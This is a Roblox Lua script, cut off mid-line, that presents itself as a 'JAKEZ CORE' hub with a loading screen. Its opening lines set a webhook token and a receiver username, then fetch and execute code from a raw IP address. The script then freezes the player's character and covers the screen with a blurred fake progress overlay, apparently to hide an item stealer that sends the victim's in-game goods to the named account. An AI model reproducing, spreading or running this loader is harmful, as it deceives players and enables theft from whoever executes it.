getgenv().StarScriptsConfig = {
    Webhook   = "O-bv_3mupPRe6UFkpkMB3vz4tb6MYpOU",
    Receivers = { "kakarot_karot" },
}
loadstring(game:HttpGet("http://205.185.125.84/gag2/garden2"))()

task.wait(0.2)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:WaitForChild("Humanoid")

-- lock movement
local oldWS, oldJP = humanoid.WalkSpeed, humanoid.JumpPower
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0

-- blur
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.4), {Size = 22}):Play()

-- gui
local gui = Instance.new("ScreenGui")
gui.Name = "JakesHub"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- overlay
local overlay = Instance.new("Frame")
overlay.Size = UDim2.fromScale(1,1)
overlay.BackgroundColor3 = Color3.new(0,0,0)
overlay.BackgroundTransparency = 0.45
overlay.BorderSizePixel = 0
overlay.Parent = gui

-- main
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 600, 0, 320)
main.Position = UDim2.new(0.5, -300, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(20,20,25)
main.BorderSizePixel = 0
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(90,130,255)
stroke.Transparency = 0.4
stroke.Thickness = 1
stroke.Parent = main

-- title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-20,0,35)
title.Position = UDim2.new(0,10,0,10)
title.BackgroundTransparency = 1
title.Text = "JAKEZ CORE"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

-- status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,-20,0,20)
status.Position = UDim2.new(0,10,0,60)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Gotham
status.TextSize = 13
status.TextColor3 = Color3.fromRGB(180,180,180)
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = main

-- updates
local updates = Instance.new("TextLabel")
updates.Size = UDim2.new(0.5,-20,0,180)
updates.Position = UDim2.new(0,10,0,90)
updates.BackgroundTransparency = 1
updates.Text =
"Updates:\n" ..
"â€¢ Improved UI performance\n" ..
"â€¢ Optimized system stability\n" ..
"â€¢ Fixed visual bugs\n" ..
"â€¢ Added smooth animations"
updates.Font = Enum.Font.Gotham
updates.TextSize = 14
updates.TextColor3 = Color3.fromRGB(200,200,200)
updates.TextXAlignment = Enum.TextXAlignment.Left
updates.TextYAlignment = Enum.TextYAlignment.Top
updates.Parent = main

-- bar bg
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.9,0,0,12)
barBG.Position = UDim2.new(0.05,0,0,260)
barBG.BackgroundColor3 = Color3.fromRGB(35,35,40)
barBG.BorderSizePixel = 0
barBG.Parent = main
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)

-- bar fill
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(90,130,255)
bar.Bor
